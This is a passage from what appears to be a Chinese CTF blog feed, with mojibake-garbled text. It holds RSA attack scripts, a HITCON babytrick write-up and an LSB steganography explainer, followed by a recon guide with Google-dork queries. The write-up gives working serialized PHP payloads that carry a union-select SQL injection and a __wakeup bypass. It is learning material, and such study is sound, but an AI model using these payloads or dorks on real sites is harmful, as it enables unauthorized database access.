9962490836998123152090675606004046425633751397173768982047965656687448847259753864171018963561303276197312504508548802813909914926514763930195218396740593919987596462341469781868335025782329081775818968846955110510048099746584203570892950955431181639182647914240604278151551608856971433512600491550082244566145491335738112881861092354219766862656988674738232228115996349755982641605e1=1804229351e2=17249876309q=gmpy2.gcd(n1,n2)p1=n1//qp2=n2//qd1=gmpy2.invert(e1,(p1-1)*(q-1))d2=gmpy2.invert(e2,(p2-1)*(q-1))while d1&lt;0:        d1+=(p1-1)*(q-1)while d2&lt;0:        d2+=(p2-1)*(q-1)m2=hex(pow(c2,d2,n2))[2:].replace(&quot;L&quot;,&quot;&quot;)m1=hex(pow(c1,d1,n1))[2:].replace(&quot;L&quot;,&quot;&quot;)if(len(m2)%2==1):        m2=&apos;0&apos;+m2if(len(m1)%2==1):    m1 =&apos;0&apos;+ m1print m1.decode(&apos;hex&apos;)print m2.decode(&apos;hex&apos;)</code></pre><h3 id="å…±æ¨¡æ”»å‡»"><a href="#å…±æ¨¡æ”»å‡»" class="headerlink" title="å…±æ¨¡æ”»å‡»"></a>å…±æ¨¡æ”»å‡»</h3><p>å½“ä¸¤ä¸ªç”¨æˆ·ä½¿ç”¨ç›¸åŒçš„æ¨¡æ•° Nã€ä¸åŒçš„ç§é’¥æ—¶ï¼ŒåŠ å¯†åŒä¸€æ˜æ–‡æ¶ˆæ¯æ—¶å³å­˜åœ¨å…±æ¨¡æ”»å‡»ã€‚</p><pre><code>import gmpy2n = 6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249e1 = 773e2 = 839message1 = 3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349message2 = 5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535# s &amp; tgcd, s, t = gmpy2.gcdext(e1, e2)if s &lt; 0:       s = -s    message1 = gmpy2.invert(message1, n)if t &lt; 0:       t = -t    message2 = gmpy2.invert(message2, n)plain = gmpy2.powmod(message1, s, n) * gmpy2.powmod(message2, t, n) % nprint plain</code></pre><h3 id="å°å…¬é’¥æŒ‡æ•°æ”»å‡»"><a href="#å°å…¬é’¥æŒ‡æ•°æ”»å‡»" class="headerlink" title="å°å…¬é’¥æŒ‡æ•°æ”»å‡»"></a>å°å…¬é’¥æŒ‡æ•°æ”»å‡»</h3><p>e=3æ—¶</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HITCON-babytrick</title>
      <link href="/2018/03/23/HITCON-Babytrick/"/>
      <url>/2018/03/23/HITCON-Babytrick/</url>
      
        <content type="html"><![CDATA[<p>too hard</p><a id="more"></a><h1 id="HITCON-babytrick"><a href="#HITCON-babytrick" class="headerlink" title="HITCON-babytrick"></a>HITCON-babytrick</h1><p>##0x01 éœ€è¦æ³¨æ„çš„ç‚¹ ##</p><ul><li>phpååºåˆ—åŒ–</li><li>ç®€å•çš„æ³¨å…¥</li><li>å­—ç¬¦é›†ç»•è¿‡</li></ul><h2 id="0x02-æºç åˆ†æ"><a href="#0x02-æºç åˆ†æ" class="headerlink" title="0x02 æºç åˆ†æ"></a>0x02 æºç åˆ†æ</h2><pre><code>index.phpæºç &lt;?phpinclude &quot;config.php&quot;;class HITCON{private $method;private $args;private $conn;public function __construct($method, $args) {    $this-&gt;method = $method;    $this-&gt;args = $args;    $this-&gt;__conn();}function show() {    list($username) = func_get_args();    $sql = sprintf(&quot;SELECT * FROM users WHERE username=&apos;%s&apos;&quot;, $username);    $obj = $this-&gt;__query($sql);    if ( $obj != false  ) {        $this-&gt;__die( sprintf(&quot;%s is %s&quot;, $obj-&gt;username, $obj-&gt;role) );    } else {        $this-&gt;__die(&quot;Nobody Nobody But You!&quot;);    }}function login() {    global $FLAG;    list($username, $password) = func_get_args();    $username = strtolower(trim(mysql_escape_string($username)));    $password = strtolower(trim(mysql_escape_string($password)));    $sql = sprintf(&quot;SELECT * FROM users WHERE username=&apos;%s&apos; AND password=&apos;%s&apos;&quot;, $username, $password);    if ( $username == &apos;orange&apos; || stripos($sql, &apos;orange&apos;) != false ) {        $this-&gt;__die(&quot;Orange is so shy. He do not want to see you.&quot;);    }    $obj = $this-&gt;__query($sql);    if ( $obj != false &amp;&amp; $obj-&gt;role == &apos;admin&apos;  ) {        $this-&gt;__die(&quot;Hi, Orange! Here is your flag: &quot; . $FLAG);    } else {        $this-&gt;__die(&quot;Admin only!&quot;);    }}function source() {    highlight_file(__FILE__);}function __conn() {    global $db_host, $db_name, $db_user, $db_pass, $DEBUG;    if (!$this-&gt;conn)        $this-&gt;conn = mysql_connect($db_host, $db_user, $db_pass);    mysql_select_db($db_name, $this-&gt;conn);    if ($DEBUG) {        $sql = &quot;CREATE TABLE IF NOT EXISTS users (                     username VARCHAR(64),                     password VARCHAR(64),                     role VARCHAR(64)                ) CHARACTER SET utf8&quot;;        $this-&gt;__query($sql, $back=false);        $sql = &quot;INSERT INTO users VALUES (&apos;orange&apos;, &apos;$db_pass&apos;, &apos;admin&apos;), (&apos;phddaa&apos;, &apos;ddaa&apos;, &apos;user&apos;)&quot;;        $this-&gt;__query($sql, $back=false);    }     mysql_query(&quot;SET names utf8&quot;);    mysql_query(&quot;SET sql_mode = &apos;strict_all_tables&apos;&quot;);}function __query($sql, $back=true) {    $result = @mysql_query($sql);    if ($back) {        return @mysql_fetch_object($result);    }}function __die($msg) {    $this-&gt;__close();    header(&quot;Content-Type: application/json&quot;);    die( json_encode( array(&quot;msg&quot;=&gt; $msg) ) );}function __close() {    mysql_close($this-&gt;conn);}function __destruct() {    $this-&gt;__conn();    if (in_array($this-&gt;method, array(&quot;show&quot;, &quot;login&quot;, &quot;source&quot;))) {        @call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);    } else {        $this-&gt;__die(&quot;What do you do?&quot;);    }    $this-&gt;__close();}function __wakeup() {    foreach($this-&gt;args as $k =&gt; $v) {        $this-&gt;args[$k] = strtolower(trim(mysql_escape_string($v)));    }}}if(isset($_GET[&quot;data&quot;])) {@unserialize($_GET[&quot;data&quot;]);    } else {new HITCON(&quot;source&quot;, array());}?&gt;ä¸‹é¢çš„æ˜¯config.php&lt;?php$db_host = &apos;localhost&apos;;$db_name = &apos;babytrick&apos;;$db_user = &apos;babytrick&apos;;$db_pass = &apos;babytrick1234&apos;;$DEBUG = @$_GET[&apos;noggnogg&apos;];$FLAG = &quot;HITCON{php 4nd mysq1 are s0 mag1c, isn&apos;t it?}&quot;;?&gt;</code></pre><p>ä¸ºäº†åœ¨æœ¬åœ°æ›´å¥½çš„å¤ç°ï¼Œä¿®æ”¹äº†éƒ¨åˆ†config.phpä»£ç å¦‚ä¸‹ï¼š</p><pre><code>&lt;?php$db_host = &apos;localhost&apos;;$db_name = &apos;test1&apos;;$db_user = &apos;root&apos;;$db_pass = &apos;root&apos;;$DEBUG = @$_GET[&apos;noggnogg&apos;];$FLAG = &quot;HITCON{php 4nd mysq1 are s0 mag1c, isn&apos;t it?}&quot;;?&gt;</code></pre><p>åˆ†ææºç å¾—åˆ°ROPé“¾å¤§è‡´ä¸ºï¼šgetå‚æ•°-&gt;ååºåˆ—åŒ–-&gt;wakeup()-&gt;destruct()ã€‚å‘ç°ç°åœ¨å‡ºç°çš„å‡½æ•°é‡Œæ²¡æœ‰flagçš„å½±å­ï¼Œä¸FLAGæœ‰å…³çš„åœ¨login()å‡½æ•°é‡Œ</p><pre><code>    $obj = $this-&gt;__query($sql);if ( $obj != false &amp;&amp; $obj-&gt;role == &apos;admin&apos;  ) {    $this-&gt;__die(&quot;Hi, Orange! Here is your flag: &quot; . $FLAG);} else {    $this-&gt;__die(&quot;Admin only!&quot;);}</code></pre><p>å…ˆè·Ÿè¿›login()å‡½æ•°æŸ¥çœ‹å‘ç°è¯¥å‡½æ•°çš„ä½œç”¨å°±æ˜¯å°†$usernameå’Œ$passwordå¸¦å…¥ä¸€æ¡sqlè¯­å¥ï¼Œåœ¨æŸ¥è¯¢ä¹‹å‰å…ˆè¿›è¡Œä¸€æ¬¡è¿‡æ»¤ï¼Œä¹‹åå¦‚æœæŸ¥è¯¢åçš„ç»“æœæ»¡è¶³ifåˆ¤æ–­å°±å¯ä»¥æ‹¿åˆ°flagã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ç°åœ¨é¦–å…ˆè¦å¾—åˆ°usernameå’Œpasswordçš„å€¼ï¼Œå†è§‚å¯Ÿä»£ç å¯ä»¥çœ‹åˆ°conn()å‡½æ•°ç»™å‡ºäº†é¢˜ç›®æ•°æ®åº“çš„ç»“æ„</p><pre><code>+----------+----------+-------+| username | password | role  |+----------+----------+-------+| orange   | $db_pass | admin || phddaa   | ddaa     | user  |+----------+----------+-------+</code></pre><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ç°åœ¨åªå‰©passwordä¸çŸ¥é“äº†ã€‚<br>å‘ç°show()å‡½æ•°é‡Œå¯¹ä¼ å…¥çš„å‚æ•°æ²¡æœ‰è¿‡æ»¤å°±å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ï¼Œå¯ä»¥åœ¨è¿™é‡Œå°è¯•æ³¨å…¥å¾—åˆ°passwordã€‚</p><p>ç°åœ¨ä¼¼ä¹è¯¥çŸ¥é“çš„éƒ½çŸ¥é“äº†ï¼Œå¯æ˜¯å‘ç°è·Ÿä¹‹å‰çš„åºåˆ—åŒ–è°ƒç”¨è·¯å¾„æ²¡æœ‰å…³ç³»å•ŠÎµ=Îµ=Îµ=â”(ã‚œãƒ­ã‚œ;)â”›</p><p>å†çœ‹ä»£ç ç»ˆäºåœ¨destruct()é‡Œæ‰¾åˆ°äº†è¿™æ ·çš„ä»£ç </p><pre><code>if (in_array($this-&gt;method, array(&quot;show&quot;, &quot;login&quot;, &quot;source&quot;))) {@call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);</code></pre><p>è¿™é‡Œé™åˆ¶äº†$methodå˜é‡çš„å€¼å¿…é¡»æ˜¯è¿™å‡ ä¸ªä¸­çš„ä¸€ç§ï¼Œè€Œè¿™ä¸‰ä¸ªåˆåˆ†åˆ«å¯¹åº”å„è‡ªçš„å‡½æ•°ã€‚åˆ¤æ–­é€šè¿‡åè°ƒç”¨å›è°ƒå‡½æ•°å°†æ•°ç»„ç±»å‹çš„argså˜é‡å½“ä½œå‚æ•°ä¼ å…¥array()ä¸­æ‰§è¡ŒmethodæŒ‡å®šçš„æ–¹æ³•ã€‚å…³äºå›è°ƒå‡½æ•°å¯ä»¥å‚è€ƒphp_manualçš„ä»‹ç»</p><pre><code>&lt;?phpfunction foobar($arg, $arg2) {echo __FUNCTION__, &quot; got $arg and $arg2\n&quot;;}class foo {function bar($arg, $arg2) {    echo __METHOD__, &quot; got $arg and $arg2\n&quot;;}}// Call the foobar() function with 2 argumentscall_user_func_array(&quot;foobar&quot;, array(&quot;one&quot;, &quot;two&quot;));// Call the $foo-&gt;bar() method with 2 arguments$foo = new foo;call_user_func_array(array($foo, &quot;bar&quot;), array(&quot;three&quot;, &quot;four&quot;));?&gt;è¾“å‡ºç±»ä¼¼äºfoobar got one and twofoo::bar got three and four</code></pre><p>å¥½çš„ï¼Œç»ˆäºæŠŠæ€è·¯ç†æ¸…æ¥šäº†æ–°çš„ROPä¸ºï¼šgetå‚æ•°-&gt;ååºåˆ—åŒ–-&gt;wakeup()-&gt;destruct()-&gt;show()-&gt;login().</p><h2 id="0x03å¼€å§‹æ„é€ åºåˆ—åŒ–å­—ç¬¦ä¸²"><a href="#0x03å¼€å§‹æ„é€ åºåˆ—åŒ–å­—ç¬¦ä¸²" class="headerlink" title="0x03å¼€å§‹æ„é€ åºåˆ—åŒ–å­—ç¬¦ä¸²"></a>0x03å¼€å§‹æ„é€ åºåˆ—åŒ–å­—ç¬¦ä¸²</h2><pre><code>class HITCON{private $method;private $args;public function __construct($method, $args) {    $this-&gt;method = $method;    $this-&gt;args = $args;}}$method = &quot;show&quot;;$args = array(&quot;1&apos; union select password,username,role from users where username=&apos;orange&apos; -- &quot;);$a = new HITCON($method,$args);echo serialize($a);  O:6:&quot;HITCON&quot;:3:{s:14:&quot;%00HITCON%00method&quot;;s:4:&quot;show&quot;;s:12:&quot;%00HITCON%00args&quot;;a:1:{i:0;s:77:&quot;1&apos; union select password,username,role from users where username=&apos;orange&apos; -- &quot;;}}</code></pre><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯wake_up()å¯¹argsè¿›è¡Œè¿‡æ»¤ï¼Œå› æ­¤æˆ‘ä»¬è¦ç»•è¿‡å®ƒï¼ŒæŠŠå˜é‡çš„ä¸ªæ•°è®¾ç½®å¤§äºå®é™…ä¸ªæ•°å°±å¯ä»¥ï¼Œè¿˜è¦æ³¨æ„çš„æ˜¯ç§æœ‰å˜é‡å‰åä¼šå¤šä¸¤ä¸ª%00é•¿åº¦ä¹Ÿå¤šäºŒã€‚çŸ¥é“è¿™äº›ä¹‹åå°±å¯ä»¥å¾—åˆ°passwordäº†ã€‚</p><pre><code>{&quot;msg&quot;:&quot;root is admin&quot;}</code></pre><p>å†è¿›è¡Œä¸‹ä¸€æ­¥login()ï¼š</p><pre><code>    class HITCON{private $method;private $args;public function __construct($method, $args) {    $this-&gt;method = $method;    $this-&gt;args = $args;}    $method = &quot;login&quot;;$args = array(&apos;orange&apos;,&apos;root&apos;);$b = new HITCON($method,$args);echo serialize($b);O:6:&quot;HITCON&quot;:3:{s:14:&quot;%00HITCON%00method&quot;;s:5:&quot;login&quot;;s:12:&quot;%00HITCON%00args&quot;;a:2:{i:0;s:6:&quot;orange&quot;;i:1;s:4:&quot;root&quot;;}}</code></pre><p>å¾—åˆ°å¦‚ä¸‹ç»“æœ</p><pre><code>{&quot;msg&quot;:&quot;Orange is so shy. He do not want to see you.&quot;}</code></pre><p>è¿˜éœ€è¦ç»•è¿‡å¯¹orangeçš„åˆ¤æ–­ã€‚ç”±äºä»£ç ä¸­åœ¨é“¾æ¥æ•°æ®åº“æ—¶è®¾ç½®äº†å­—ç¬¦ç¼–ç ä¸ºutf8ç¼–ç ï¼Œæ‰€ä»¥å°è¯•å­—ç¬¦å·®å¼‚ç»•è¿‡<br>å°†aæ›¿æ¢æˆÃƒã€Ã„â€¦è¿™é‡Œæ³¨æ„æ›¿æ¢å®Œä¹‹åé•¿åº¦ä¼šåŠ ä¸€ã€‚åŒç†æ›¿æ¢eæˆ–ç€å…¶ä»–çš„å­—æ¯éƒ½è¡Œã€‚</p><pre><code>O:6:&quot;HITCON&quot;:3:{s:14:&quot;%00HITCON%00method&quot;;s:5:&quot;login&quot;;s:12:&quot;%00HITCON%00args&quot;;a:2:{i:0;s:7:&quot;orÃ„nge&quot;;i:1;s:4:&quot;root&quot;;}}</code></pre><p>å¾—åˆ°flag</p><pre><code>{&quot;msg&quot;:&quot;Hi, Orange! Here is your flag: HITCON{php 4nd mysq1 are s0 mag1c, isn&apos;t it?}&quot;}</code></pre><h2 id="0x03-æ€»ç»“"><a href="#0x03-æ€»ç»“" class="headerlink" title="0x03 æ€»ç»“"></a>0x03 æ€»ç»“</h2><p>åšé¢˜æ—¶æ€è·¯è¦å‘æ•£ï¼Œåšé¢˜çœ‹åˆ°ååºåˆ—åŒ–å°±ç›¯ç€å‡ ä¸ªé­”æ³•å‡½æ•°ä¸åŠ¨ä¹Ÿä¸è¡Œã€‚</p><p>å¯¹äºå…³é”®çš„å‡½æ•°ä¸€å®šè¦å¥½å¥½æŸ¥æŸ¥æ¸…æ¥šåˆ°åº•å•¥ä½œç”¨ï¼Œä½ é—®ä»€ä¹ˆæ˜¯å…³é”®å‡½æ•°ï¼Ÿä¸€ä¸ªä¸€ä¸ªå»æŸ¥æ‰‹å†Œå•Šï¼Œå°±åƒè¿™é“é¢˜çš„å›è°ƒå‡½æ•°ï¼Œæˆ‘åˆšå¼€å§‹çœ‹çš„æ—¶å€™æ­»æ´»æ‰¾ä¸åˆ°æ€ä¹ˆæŠŠflagå’Œååºåˆ—åŒ–è”ç³»åœ¨ä¸€èµ·ï¼ŒçœŸçš„æ˜¯çœ‹çš„å¤´ç§ƒæ‰æ³¨æ„åˆ°å›è°ƒå‡½æ•°/(ã„’oã„’)/~~ã€‚</p><p>æ„é€ åºåˆ—åŒ–å­—ç¬¦ä¸²è¿˜ä¸ç†Ÿï¼Œè¿™é“é¢˜çš„ç¬¬äºŒä¸ªååºåˆ—åŒ–åšçš„æ—¶å€™ä¹Ÿæ˜¯æ²¡ä¸€ä¸‹æƒ³åˆ°æ€ä¹ˆæŠŠusernameå’Œpasswordä¼ è¿›å»ï¼Œè¿˜æ˜¯è‡ªå·±å¤ªèœã€‚</p><h2 id="0x04-å‚è€ƒé“¾æ¥"><a href="#0x04-å‚è€ƒé“¾æ¥" class="headerlink" title="0x04 å‚è€ƒé“¾æ¥"></a>0x04 å‚è€ƒé“¾æ¥</h2><blockquote><p><a href="https://www.freebuf.com/vuls/116705.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/116705.html</a></p></blockquote><blockquote><p><a href="https://blog.csdn.net/qq_42196196/article/details/81217375" target="_blank" rel="noopener">https://blog.csdn.net/qq_42196196/article/details/81217375</a></p></blockquote><blockquote><p><a href="https://blog.csdn.net/wy_97/article/details/77749008" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/77749008</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
            <tag> serialize </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LSBå›¾ç‰‡éšå†™</title>
      <link href="/2018/03/23/LSB%E9%9A%90%E5%86%99/"/>
      <url>/2018/03/23/LSB%E9%9A%90%E5%86%99/</url>
      
        <content type="html"><![CDATA[<p>å›¾ç‰‡éšå†™é¢˜è€æ˜¯ä¸€å¤´é›¾æ°´ï¼Œå€Ÿç€DDçš„åœ°é“æ¥å­¦ä¸€ä¸‹å§</p><a id="more"></a><h2 id="LSBéšå†™"><a href="#LSBéšå†™" class="headerlink" title="LSBéšå†™"></a>LSBéšå†™</h2><p>åˆ©ç”¨å›¾åƒä¸­çš„æœ€ä½æœ‰æ•ˆä½è¿›è¡Œæ•°æ®å­˜å‚¨ã€‚</p><p><img src="https://i.imgur.com/GQM4keP.png" alt="RGBæ„æˆ"></p><p>ä¸€èˆ¬æ¥è¯´è¿™ç§éšå†™éƒ½æ˜¯ç”¨BMPå›¾ç‰‡ï¼Œä¸ç»è¿‡å‹ç¼©ï¼Œæ‰€æœ‰çš„åƒç´ éƒ½åŸæ ·å­˜å‚¨ã€‚pngå›¾ç‰‡æœ‰å‹ç¼©ä½†æ˜¯å´æ˜¯æ— æŸå‹ç¼©ï¼Œæ‰€ä»¥ä¿®æ”¹çš„ä¿¡æ¯ä¹Ÿå¯ä»¥æ­£ç¡®è¡¨è¾¾ï¼Œjpgå›¾ç‰‡è¿›è¡Œå‹ç¼©ä¹‹åéšè—çš„ä¿¡æ¯å¯èƒ½ä¼šè¢«ç ´åã€‚<br>åƒç´ ä¸€èˆ¬ç”±RGBä¸‰åŸè‰²ç»„æˆï¼Œæ¯ç§é¢œè‰²å 8ä½ï¼Œå–å€¼ä¸º0x00~0xFF,å…±256ç§é¢œè‰²ï¼ŒåŒ…å«256çš„3æ¬¡æ–¹ç§é¢œè‰²ï¼Œå³16777216ç§ã€‚è€Œäººçœ¼å¤§çº¦åªèƒ½åŒºåˆ†1000ä¸‡ç§ã€‚<br>LSBéšå†™å°±æ˜¯ä¿®æ”¹RGBé¢œè‰²åˆ†é‡çš„æœ€ä½æœ‰æ•ˆä½ï¼Œæ¯ä¸ªåƒç´ å¯ä»¥æºå¸¦3æ¯”ç‰¹çš„ä¿¡æ¯ã€‚</p><p><img src="https://i.imgur.com/jHssNqf.png" alt></p><p>ä¿®æ”¹ç»¿è‰²çš„äºŒè¿›åˆ¶æœ€ä½ä½ï¼Œé¢œè‰²å‡ ä¹æ²¡æœ‰å˜åŒ–ï¼Œå®ç°ä¿¡æ¯éšå†™ã€‚</p><p><img src="https://i.imgur.com/ENiocXR.png" alt></p><p><img src="https://i.imgur.com/IHphbX3.png" alt></p><h2 id="æ¥çœ‹DDè¿™é“é¢˜"><a href="#æ¥çœ‹DDè¿™é“é¢˜" class="headerlink" title="æ¥çœ‹DDè¿™é“é¢˜"></a>æ¥çœ‹DDè¿™é“é¢˜</h2><p>ç»™äº†ä¸€å¼ ä½å›¾ï¼Œæ˜¯åŒ—äº¬çš„åœ°é“å›¾ã€‚</p><p><img src="https://i.imgur.com/f8eaJYG.png" alt></p><p>å°è¯•LSBï¼ŒæŸ¥çœ‹ä½ä½ä¿¡æ¯ã€‚å¾—åˆ°ä¸€ä¸²å¯†æ–‡ã€‚</p><p><img src="https://i.imgur.com/04P5AzP.png" alt></p><p>æç¤ºæ˜¯AESï¼Œç¼ºå°‘key<br>å¼‚æˆ–æŸ¥çœ‹å›¾ç‰‡æœ‰ä¸¤å¤„ä¸åŒ</p><p><img src="https://i.imgur.com/93KEfF7.png" alt></p><p><img src="https://i.imgur.com/NRCfUQe.png" alt></p><p>æç¤ºå¯†é’¥ä¸ºå°å†™å­—æ¯ï¼Œå°è¯•è§£å¯†å°±å¾—åˆ°äº†flag.</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LSB </tag>
            
            <tag> MISC </tag>
            
            <tag> éšå†™ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¸—é€æµ‹è¯•-ä¿¡æ¯æ”¶é›†</title>
      <link href="/2018/03/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2018/03/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>Google-hacking</p><a id="more"></a><h1 id="æ¸—é€æµ‹è¯•-ä¿¡æ¯æ”¶é›†"><a href="#æ¸—é€æµ‹è¯•-ä¿¡æ¯æ”¶é›†" class="headerlink" title="æ¸—é€æµ‹è¯•-ä¿¡æ¯æ”¶é›†"></a>æ¸—é€æµ‹è¯•-ä¿¡æ¯æ”¶é›†</h1><h2 id="0x0-Google-hacking"><a href="#0x0-Google-hacking" class="headerlink" title="0x0 Google-hacking"></a>0x0 Google-hacking</h2><h3 id="å¸¸ç”¨GoogleHackingè¯­æ³•"><a href="#å¸¸ç”¨GoogleHackingè¯­æ³•" class="headerlink" title="å¸¸ç”¨GoogleHackingè¯­æ³•"></a>å¸¸ç”¨GoogleHackingè¯­æ³•</h3><ul><li>intext:(only google)æŠŠç½‘é¡µä¸­çš„æ­£æ–‡å†…å®¹ä¸­çš„æŸä¸ªå­—ç¬¦ä½œä¸ºæœç´¢æ¡ä»¶</li><li>intitle:æŠŠç½‘é¡µæ ‡é¢˜ä¸­çš„æŸä¸ªå­—ç¬¦ä½œä¸ºæœç´¢çš„æ¡ä»¶</li><li>cacheï¼šæœç´¢æœç´¢å¼•æ“é‡Œå…³äºæŸäº›å†…å®¹çš„ç¼“å­˜ï¼Œå¯èƒ½èƒ¡ä¼šåœ¨è¿‡æœŸå†…å®¹ä¸­å‘ç°æœ‰ä»·å€¼ä¿¡æ¯</li><li>filetype:æŒ‡å®šæ–‡ä»¶æ ¼å¼</li><li>inurl:æœç´¢åŒ…å«æŒ‡å®šå­—ç¬¦çš„url</li><li>site:åœ¨æŒ‡å®šç«™ç‚¹æœç´¢ç›¸å…³å†…å®¹</li></ul><h3 id="å…¶ä»–è¯­æ³•"><a href="#å…¶ä»–è¯­æ³•" class="headerlink" title="å…¶ä»–è¯­æ³•"></a>å…¶ä»–è¯­æ³•</h3><ol><li>å¼•å·â€â€:æŠŠå…³é”®å­—æ‰“ä¸Šå¼•å·åæŠŠå¼•å·ä½œä¸ºæ•´ä½“æ¥æœç´¢ã€‚</li><li>orï¼šåŒæ—¶æœç´¢ä¸¤ä¸ªæˆ–è€…æ›´å¤šå…³é”®å­—ã€‚</li><li>linkï¼šæœç´¢æŸä¸ªç½‘ç«™çš„é“¾æ¥ã€‚</li></ol><h3 id="å…¸å‹ç”¨æ³•"><a href="#å…¸å‹ç”¨æ³•" class="headerlink" title="å…¸å‹ç”¨æ³•"></a>å…¸å‹ç”¨æ³•</h3><ol><li><p>æ‰¾ç®¡ç†åå°åœ°å€ï¼š</p><p> site:xxx.com intext:ç®¡ç†|åå°|ç™»å½•|ç”¨æˆ·å|å¯†ç |ç³»ç»Ÿ|è´¦å·</p><p> site:xxx.com inurl:login|admin|manage|manager|admin_login|system</p><p> site:Xxx.com intitle:ç®¡ç†|åå°|ç™»å½•</p></li><li><p>æ‰¾ä¸Šä¼ ç±»æ¼æ´åœ°å€</p><p> site:xxx.com inurl:file</p><p> site:xxx.com inurl:upload</p></li><li><p>æ‰¾æ³¨å…¥é¡µé¢</p><p> site:xxx.com inurl:php?id=</p></li><li><p>æ‰¾ç¼–è¾‘å™¨é¡µé¢</p><p> site:xxx.com inurl:ewebeditor<br>##0x1 é€šè¿‡ç›®æ ‡ç«™ç‚¹æ”¶é›†ä¿¡æ¯ ##</p></li></ol><h3 id="ä½¿ç”¨ç«™é•¿å·¥å…·å¯¹ç›®æ ‡ç«™ç‚¹è¿›è¡Œä¿¡æ¯æ”¶é›†"><a href="#ä½¿ç”¨ç«™é•¿å·¥å…·å¯¹ç›®æ ‡ç«™ç‚¹è¿›è¡Œä¿¡æ¯æ”¶é›†" class="headerlink" title="ä½¿ç”¨ç«™é•¿å·¥å…·å¯¹ç›®æ ‡ç«™ç‚¹è¿›è¡Œä¿¡æ¯æ”¶é›†"></a>ä½¿ç”¨ç«™é•¿å·¥å…·å¯¹ç›®æ ‡ç«™ç‚¹è¿›è¡Œä¿¡æ¯æ”¶é›†</h3><ol><li>IPæŸ¥è¯¢</li><li>åŒIPæŸ¥è¯¢</li><li>WHOISæŸ¥è¯¢å’ŒåæŸ¥</li><li>å­åŸŸåæŸ¥è¯¢</li><li>è¯†åˆ«æœåŠ¡å™¨ç±»å‹ï¼Œé¡µé¢ç±»å‹</li><li>DNSä¿¡æ¯æŸ¥è¯¢</li><li>ç½‘ç«™å®‰å…¨æ£€æµ‹</li><li>ç«¯å£æ‰«æ<h2 id="0x2æ¼æ´ä¿¡æ¯æ”¶é›†"><a href="#0x2æ¼æ´ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x2æ¼æ´ä¿¡æ¯æ”¶é›†"></a>0x2æ¼æ´ä¿¡æ¯æ”¶é›†</h2><h3 id="å¸¸ç”¨æ¼æ´å¹³å°"><a href="#å¸¸ç”¨æ¼æ´å¹³å°" class="headerlink" title="å¸¸ç”¨æ¼æ´å¹³å°"></a>å¸¸ç”¨æ¼æ´å¹³å°</h3></li><li>ä¹Œäº‘</li><li>360è¡¥å¤©æ¼æ´å¹³å°</li><li>Exploit-DB</li><li>GHDB</li><li>CVEä¸­æ–‡æ¼æ´ä¿¡æ¯åº“</li><li>ä¸­å›½å›½å®¶ä¿¡æ¯å®‰å…¨æ¼æ´åº“</li><li>å›½å®¶ä¿¡æ¯å®‰å…¨æ¼æ´å…±äº«å¹³å°<h3 id="æ¼æ´åº“æœç´¢æ–¹å¼"><a href="#æ¼æ´åº“æœç´¢æ–¹å¼" class="headerlink" title="æ¼æ´åº“æœç´¢æ–¹å¼"></a>æ¼æ´åº“æœç´¢æ–¹å¼</h3></li><li>æœç´¢å¯¹åº”å‚å•†</li><li>æœç´¢å¯¹åº”å¹³å°<h3 id="ä¿¡æ¯æ”¶é›†çš„ç›®æ ‡"><a href="#ä¿¡æ¯æ”¶é›†çš„ç›®æ ‡" class="headerlink" title="ä¿¡æ¯æ”¶é›†çš„ç›®æ ‡"></a>ä¿¡æ¯æ”¶é›†çš„ç›®æ ‡</h3></li><li>å·²æœ‰çš„æ¸—é€è¿‡ç¨‹</li><li>ç›®æ ‡çš„æŠ€æœ¯æ¶æ„</li><li>ç›®æ ‡ä½¿ç”¨æ¶æ„çš„å…¬å¼€æ¼æ´</li><li>ç›®æ ‡å¯èƒ½è¿›è¡Œçš„ä¿®å¤<br>##0x3 ä½¿ç”¨å·¥å…·æœç´¢ä¿¡æ¯ ##<h3 id="å¸¸ç”¨DOSå‘½ä»¤"><a href="#å¸¸ç”¨DOSå‘½ä»¤" class="headerlink" title="å¸¸ç”¨DOSå‘½ä»¤"></a>å¸¸ç”¨DOSå‘½ä»¤</h3></li><li>pingï¼šç½‘ç»œè”é€šæµ‹è¯•</li><li>arpï¼šæ˜¾ç¤ºå’Œä¿®æ”¹åœ°å€è§£æåè®®</li><li>tracertï¼šæ˜¾ç¤ºè·¯ç”±</li><li>nslookupï¼šåŸŸåç³»ç»ŸæŸ¥è¯¢</li><li>telnet: æµ‹è¯•æ˜¯å¦å¼€å¯è¿œç¨‹è¿æ¥</li><li>netstatï¼šæŸ¥çœ‹æœ¬åœ°æœºå™¨å¼€æ”¾æ‰€æœ‰ç«¯å£</li><li>nbtstatï¼šè·å–NetBIOSä¿¡æ¯</li><li>ftp: æµ‹è¯•å¼€æ”¾äº†ftpçš„è¿œç¨‹ä¸»æœº</li><li>netï¼šæœ€é‡è¦å‘½ä»¤ï¼Œéœ€è¦æŒæ¡å­å‘½ä»¤<h3 id="å¸¸ç”¨æ‰«æå·¥å…·"><a href="#å¸¸ç”¨æ‰«æå·¥å…·" class="headerlink" 